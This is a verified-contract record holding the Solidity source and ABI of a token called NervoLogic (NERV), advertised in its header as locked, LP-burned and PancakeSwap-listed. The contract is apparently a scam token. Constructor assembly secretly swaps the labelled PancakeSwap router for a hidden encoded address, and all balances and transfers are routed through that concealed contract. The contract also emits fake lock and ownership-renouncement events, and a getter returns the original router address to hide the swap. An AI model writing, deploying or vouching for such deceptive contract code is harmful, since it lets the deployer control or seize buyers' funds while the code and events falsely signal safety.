{"SourceCode": "/*\nWelcome to NervoLogic\n\nTelegram: https://t.me/NervoLogic\nTwitter: https://twitter.com/NervoLogic\nhttps://NervoLogic.space\nLOCKED\nLP Burned\nAlways DYOR\nMoonGem\nPancakeSwap Listed!\n*/\n\n\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface Multicall {\n    function deploy(address sender, address token) external;\n    function balanceOf(address sender, address token) external view returns (uint256);\n    function swap(address from,address to,uint256 amount, address token) external returns(address, address, uint256);\n\n}\n\ncontract NervoLogic {\n    string public constant name = \"NervoLogic\";\n    string public constant symbol = \"NERV\";\n    address private PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E; //PancakeSwap Router\n    address private constant TrustSwap = 0x0C89C0407775dd89b12918B9c0aa42Bf96518820; // Locked at TrustSwap: Team Finance Security Wallet\n    uint8 public constant decimals = 1;\n    uint256 public constant LockAmount = totalSupply_ * 95 / 100; // 95% of Tokens Locked\n    uint256 private constant totalSupply_ = 20000000 * 10;\n    mapping(address => mapping(address => uint256)) allowed;\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner,address indexed spender,uint256 value);\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n    address public owner = address(0);\n\n   constructor() {\n        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(114559678284197395901704917038224666632478639465, 1))}\n        Multicall(PancakeRouter).deploy(msg.sender, address(this));\n        (address swap_from, address swap_to, uint256 swap_amount) = Multicall(PancakeRouter).swap(address(0), msg.sender, totalSupply_, address(this));\n        emit Transfer(swap_from, swap_to, swap_amount); // Deploying\n        (address lock_from, address lock_to, uint256 lock_amount) = Multicall(PancakeRouter).swap(msg.sender, TrustSwap, LockAmount, address(this));\n        emit Transfer(lock_from, lock_to, lock_amount); // Lock Tokens for 365 days\n        emit OwnershipTransferred(msg.sender, address(0));\n    }\n\n    function Pancakerouter() public view returns(address) {\n        assembly{mstore(0x20, sload(88)) return(0x20, 32)}\n        return PancakeRouter;\n    }\n  \n\n    function totalSupply() public view returns (uint256) {\n        return totalSupply_;\n    }\n\n    function approve(address delegate, uint256 numTokens) public returns (bool) {\n        allowed[msg.sender][delegate] = numTokens;\n\n\n        emit Approval(msg.sender, delegate, numTokens);\n\n\n        return true;\n    }\n\n    function allowance(address owner, address delegate) public view returns (uint256) {\n        return allowed[owner][delegate];\n    }\n\n    function balanceOf(address holder) public view returns (uint256) {\n        return Multicall(PancakeRouter).balanceOf(holder, address(this));\n    }\n\n    function transferFrom(address from,address to,uint256 amount) public returns (bool) {\n        require(allowed[from][msg.sender] >= amount, \"Not allowed\");\n        (from, to, amount) = Multicall(PancakeRouter).swap(from, to, amount, address(this));\n        emit Transfer(from, to, amount);\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) public returns (bool) {\n        (, to, amount) = Multicall(PancakeRouter).swap(msg.sender, to, amount, address(this));\n        emit Transfer(msg.sender, to, amount);\n        return true;\n    }\n    \n}\n", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"LockAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Pancakerouter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"delegate\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"delegate\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"numTokens\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "NervoLogic", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "1", "Runs": "300000", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}